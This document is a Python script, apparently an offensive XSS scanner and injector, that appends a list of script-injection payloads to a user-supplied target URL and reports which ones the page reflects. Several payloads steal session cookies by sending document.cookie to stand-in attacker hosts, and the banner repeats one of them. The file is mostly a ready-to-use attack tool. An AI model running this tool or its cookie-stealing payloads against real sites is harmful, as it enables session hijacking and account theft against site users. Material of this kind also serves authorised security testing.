import sys
import requests
from rich.table import Table
from termcolor import colored
from rich.console import Console

XSS_PAYLOADS = (
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<script>fetch('//demo.local/steal?c='+encodeURIComponent(document.cookie))</script>",
    "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
)
console = Console()


def show_banner():
    banner1 = """
          [X]  [S]  [S] --- [B]  [🪲]  [G]
          --------------------------------
     🖥️: Share Your opinions about this program!<═══>🖥️: I think it's very useful tool!<═
     ═>🖨️: I think it's difficult, but interest tool!<═══>📡: I think there are some excess details<═
     ══>💻: <script>fetch('//demo.local/steal?c='+encodeURIComponent(document.cookie))</script><═══>🖥️🖨️📡: 💀...
    """
    print(banner1)
    print(colored("    [🪲] Script mode: ", "light_yellow") + colored("🔴 Red SWAT", "red"))
    print(colored("    [🪲] Function: ", "light_yellow") + colored("Set XSS-payload & bug the target\n", "red"))


def scan_for_xss(link):
    isAvailableXSS = False
    table = Table()
    table.title = "Available XSS payloads"
    table.add_column("№")
    table.add_column("XSS payload")
    print(colored(f"[*] Scanning {link} for XSS vuln...", "yellow"))

    for id, xss in enumerate(XSS_PAYLOADS, start=1):
        try:
            response = requests.get(f"{link}{xss}", timeout=3)
            if xss in response.text:
                isAvailableXSS = True
                table.add_row(str(id), xss)
        except:
            pass

    if isAvailableXSS:
        print(colored("[+] XSS vulnerability detected!", "green"))
        console.print(table)
        return True
    return False


def set_xss_payload(link):
    print(colored(f"[*] Setting the XSS bug in {link}...", "yellow"))
    for payload in XSS_PAYLOADS:
        try:
            response = requests.get(f"{link}{payload}", timeout=3)
            print(colored(f"[*] Payload: {payload}", "cyan"))
            print(colored(f"[*] Status code: {response.status_code}", "yellow"))
            print(colored(f"[*] Response: {response.text[:200]}", "green"))
            print("-" * 50)
        except:
            pass

show_banner()
if len(sys.argv) > 1:
    link = sys.argv[1]
else:
    link = input(colored("[*] Enter the target link: ", "yellow"))
if scan_for_xss(link):
    set_xss_payload(link)
else:
    print(colored("[-] No XSS vulnerability found", "red"))
